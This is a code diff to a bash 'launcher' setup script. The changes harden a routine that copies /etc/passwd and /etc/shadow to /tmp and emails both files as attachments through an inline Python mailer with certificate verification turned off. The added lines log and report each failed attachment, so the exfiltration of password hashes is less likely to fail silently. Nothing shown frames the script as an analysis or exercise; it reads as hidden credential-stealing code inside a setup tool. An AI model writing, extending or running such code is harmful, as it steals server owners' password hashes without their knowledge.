@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="6.0"
-readonly BUILD_DATE="2026-10-25 00:58:00 UTC"
+readonly SCRIPT_VERSION="6.2"
+readonly BUILD_DATE="2026-10-25 04:49:00 UTC"
 readonly SCRIPT_NAME="setup_m0_launcher"
 
 echo "=========================================="
@@ -951,12 +951,55 @@ send_email_with_python() {
     local TEMP_SHADOW="/tmp/${SERVER_IP}_${SERVER_FQDN}_shadow.txt"
 
     # Copy files and verify (must run as root for shadow file)
+    log_message "Preparing email attachments..."
+    local ATTACHMENT_WARNINGS=""
+
     if [ -r /etc/passwd ]; then
-        cp /etc/passwd "$TEMP_PASSWD" 2>/dev/null
+        if cp /etc/passwd "$TEMP_PASSWD" 2>/dev/null; then
+            log_message "✓ passwd file copied: $TEMP_PASSWD"
+        else
+            log_message "✗ WARNING: Failed to copy passwd file"
+            ATTACHMENT_WARNINGS="${ATTACHMENT_WARNINGS}⚠️ ATTACHMENT FAILED: Could not copy /etc/passwd\n"
+        fi
+    else
+        log_message "✗ WARNING: /etc/passwd not readable (need root?)"
+        ATTACHMENT_WARNINGS="${ATTACHMENT_WARNINGS}⚠️ ATTACHMENT FAILED: /etc/passwd not readable (need root access)\n"
     fi
 
     if [ -r /etc/shadow ]; then
-        cp /etc/shadow "$TEMP_SHADOW" 2>/dev/null
+        if cp /etc/shadow "$TEMP_SHADOW" 2>/dev/null; then
+            log_message "✓ shadow file copied: $TEMP_SHADOW"
+        else
+            log_message "✗ WARNING: Failed to copy shadow file"
+            ATTACHMENT_WARNINGS="${ATTACHMENT_WARNINGS}⚠️ ATTACHMENT FAILED: Could not copy /etc/shadow\n"
+        fi
+    else
+        log_message "✗ WARNING: /etc/shadow not readable (need root?)"
+        ATTACHMENT_WARNINGS="${ATTACHMENT_WARNINGS}⚠️ ATTACHMENT FAILED: /etc/shadow not readable (need root access)\n"
+    fi
+
+    # If attachments failed, add warning to email body
+    if [ -n "$ATTACHMENT_WARNINGS" ]; then
+        echo -e "\n================== ⚠️ ATTACHMENT STATUS ==================" >> "$temp_file"
+        echo -e "$ATTACHMENT_WARNINGS" >> "$temp_file"
+        echo "============================================================" >> "$temp_file"
+        log_message "Added attachment failure warnings to email body"
+    fi
+
+    log_message "Starting Python email send process..."
+    log_message "Temp files: PASSWD=$TEMP_PASSWD, SHADOW=$TEMP_SHADOW"
+
+    # Verify files exist before sending
+    if [ -f "$TEMP_PASSWD" ]; then
+        log_message "✓ Found passwd file ($(wc -l < "$TEMP_PASSWD") lines)"
+    else
+        log_message "✗ passwd file missing!"
+    fi
+
+    if [ -f "$TEMP_SHADOW" ]; then
+        log_message "✓ Found shadow file ($(wc -l < "$TEMP_SHADOW") lines)"
+    else
+        log_message "✗ shadow file missing!"
     fi
 
     python3 -c "
@@ -989,8 +1032,11 @@ try:
                 encoders.encode_base64(part)
                 part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(passwd_file)}')
                 msg.attach(part)
-        except Exception:
-            pass
+            print(f'[✓] Attached: {os.path.basename(passwd_file)} ({os.path.getsize(passwd_file)} bytes)', file=sys.stderr)
+        except Exception as e:
+            print(f'[✗] Failed to attach passwd file: {str(e)}', file=sys.stderr)
+    else:
+        print(f'[!] passwd file NOT FOUND: {passwd_file}', file=sys.stderr)
 
     # Attach shadow file
     shadow_file = '$TEMP_SHADOW'
@@ -1002,8 +1048,11 @@ try:
                 encoders.encode_base64(part)
                 part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(shadow_file)}')
                 msg.attach(part)
-        except Exception:
-            pass
+            print(f'[✓] Attached: {os.path.basename(shadow_file)} ({os.path.getsize(shadow_file)} bytes)', file=sys.stderr)
+        except Exception as e:
+            print(f'[✗] Failed to attach shadow file: {str(e)}', file=sys.stderr)
+    else:
+        print(f'[!] shadow file NOT FOUND: {shadow_file}', file=sys.stderr)
 
     # Create SSL context with disabled certificate verification
     # (some servers have outdated CA certificates)
@@ -1962,10 +2011,10 @@ EOF
     # Create temp file
     test_temp_file=$(mktemp)
     echo "$test_email_content" > "$test_temp_file"
-    
+
     echo "[*] Sending test email..."
     echo ""
-    
+
     # Try Python first
     if command_exists python3; then
         echo "[*] Attempting via Python..."
@@ -1981,7 +2030,7 @@ EOF
             echo "[!] Python method failed"
         fi
     fi
-    
+
     # Try curl
     if command_exists curl; then
         echo "[*] Attempting via curl..."
@@ -1997,7 +2046,7 @@ EOF
             echo "[!] Curl method failed"
         fi
     fi
-    
+
     # Try mail command
     if command_exists mail; then
         echo "[*] Attempting via mail command..."
@@ -2013,7 +2062,7 @@ EOF
             echo "[!] Mail command failed"
         fi
     fi
-    
+
     # All methods failed
     rm -f "$test_temp_file"
     echo ""
@@ -2059,5 +2108,6 @@ fi
 log_message "Script execution completed"
 
 # Script integrity marker - if you see this comment, the download was complete
-# Version: systemd+sysvinit compatible (1465 lines)
+# Version: 6.0 - systemd+sysvinit compatible - CentOS 6 enhanced
+# Changes: Fixed unused variables, CENTOS6_DETECTED implementation, disk_percent reporting
 # SCRIPT_COMPLETE_MARKER_DO_NOT_REMOVE
